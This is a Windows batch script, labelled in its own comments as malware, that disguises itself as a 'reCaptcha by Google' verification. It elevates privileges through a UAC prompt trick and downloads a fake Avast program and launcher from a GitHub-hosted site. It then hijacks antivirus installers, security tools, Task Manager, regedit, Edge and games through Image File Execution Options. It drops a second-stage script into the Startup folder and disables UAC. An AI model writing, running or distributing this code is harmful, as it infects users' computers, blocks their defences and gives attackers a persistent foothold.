@echo off
:: this file is malware
title reCaptcha by Google
color f0
echo [INFO] Verifying...
echo [INFO] ==================================================================================
echo [INFO]   reCaptcha by Google
echo [INFO] ==================================================================================
:: ================================================
:: Asks for admin with UAC prompt
:: ================================================
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo [INFO] Exiting current instance... 
    echo [INFO] If you clicked 'yes' on the prompt, then a new one has been launched
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

:: ========================================================================
:: Downloads fake avast
:: ========================================================================

cd C:\ProgramData
mkdir pawast
cd pawast
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.deps.json
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.dll
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.exe
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.pdb
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/launcher.exe

:: ===========================================================================
:: Hijacking some apps with fake avast (also blocks av installers by filename)
:: ===========================================================================

:: this is needed for the variables like !variable!
setlocal EnableDelayedExpansion

:: target
set "DEBUGGER=C:\ProgramData\pawast\launcher.exe"

:: exes to hijack
set programs=PlayGTAV.exe GTA5_Enhanced.exe GTA5_Enhanced_BE.exe avira_en_sptl1_2113967618-1754309815-1754309815-1__phpws-spotlight-release.exe MBSetup.exe TotalAV.exe avg_antivirus_free_setup.exe avast_free_antivirus_setup_online.exe RobloxPlayerBeta.exe calc.exe msedge.exe regedit.exe taskmgr.exe mspaint.exe afwServ.exe ashQuick.exe ashUpd.exe aswAvBootTimeScanShMin.exe aswChLic.exe aswEngSrv.exe aswidsagent.exe aswRunDll.exe aswToolsSvc.exe AvastNM.exe AvastSvc.exe AvastUI.exe AvBugReport.exe AvConsent.exe AvDump.exe AvEmUpdate.exe AvLaunch.exe AvDump.exe
for %%A in (%programs%) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%A" /v Debugger /t REG_SZ /d !DEBUGGER! /f
)

:: ends the setlocal seen above
endlocal

:: ========================================================================
:: Downloads stage two, puts in startup
:: ========================================================================

cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stagetwo.bat

:: ========================================================================
:: Disabling UAC prompt (saved for last just in case AV detects)
:: ========================================================================

reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

:: =================================
:: Exits stage one
:: =================================
exit


